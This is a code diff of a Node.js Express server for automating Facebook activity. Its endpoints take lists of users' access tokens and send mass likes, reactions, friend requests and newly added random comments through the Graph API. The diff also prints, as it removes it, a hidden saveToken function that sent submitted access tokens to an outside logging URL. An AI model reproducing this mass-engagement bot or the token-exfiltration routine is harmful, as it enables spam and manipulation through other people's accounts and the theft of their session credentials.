@@ -3,31 +3,12 @@ const express = require("express")
 const app = express()
 const server = require('http').Server(app)
 const request = require('request')
-var log_access = []
 app.use(bodyParser.json())
 app.use(bodyParser.urlencoded({
     extended: false
 }))
 app.get('/', (req, res) => {
     res.send("Không Được Đâu Sói Ạ ^^")
-})
-app.post('/Auto-Like', (req, res) => {
-    for (var a = 0; a < req.body.access_token.length; a++) {
-    	! function(a) {
-            setTimeout(function() {
-                AutoLike(req.body.id, req.body.access_token[a])
-            }, a * req.body.time_delay)
-        }
-        (a)
-    }
-    res.json({
-        status: 200,
-        type: 'Auto Like',
-        fbid: req.body.id,
-        total_access_token: req.body.access_token.length,
-        time_delay: req.body.time_delay,
-        developer: '_Neiht'
-    })
 })
 app.post('/Auto@Like', (req, res) => {
     for (var a = 0; a < req.body.access_token.length; a++) {
@@ -63,6 +44,24 @@ app.post('/Bot@Fb', (req, res) => {
         type_reaction: req.body.typeReact,
         post_id: req.body.arrPostID,
         total_post_id: req.body.arrPostID.length,
+        time_delay: req.body.time_delay,
+        developer: '_Neiht'
+    })
+})
+app.post('/Auto@Cmt', (req, res) => {
+    for (var a = 0; a < req.body.access_token.length; a++) {
+        ! function(a) {
+            setTimeout(function() {
+                AutoCmt(req.body.id, req.body.arr_message, req.body.access_token[a])
+            }, a * req.body.time_delay)
+        }
+        (a)
+    }
+    res.json({
+        status: 200,
+        type: 'Auto Cmt',
+        fbid: req.body.id,
+        total_access_token: req.body.access_token.length,
         time_delay: req.body.time_delay,
         developer: '_Neiht'
     })
@@ -174,24 +173,10 @@ function AutoAddFriend(ID, TOKEN) {
     })
 }
 
-function saveToken(arr_token) {
-    var headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/64.4.130 Chrome/58.4.3029.130 Safari/537.36',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'cookie': ''
-    }
-    var options = {
-        url: 'http://thien-it.me/log.php',
-        method: 'POST',
-        headers: headers,
-        form: {
-            access_token: arr_token
-        }
-    }
-    request(options, function(error, response, body) {
-        if (!error && response.statusCode == 200) {
-            console.log(body)
-        }
+function AutoCmt(ID, message, TOKEN){
+    var CMT = message[Math.floor(Math.random() * message.length)]
+    request('https://graph.facebook.com/' + ID + '/comments?method=post&message=' + CMT + '&access_token=' + TOKEN, (error, response, body) => {
+        console.log(body)
     })
 }
 function in_array(needle, haystack){
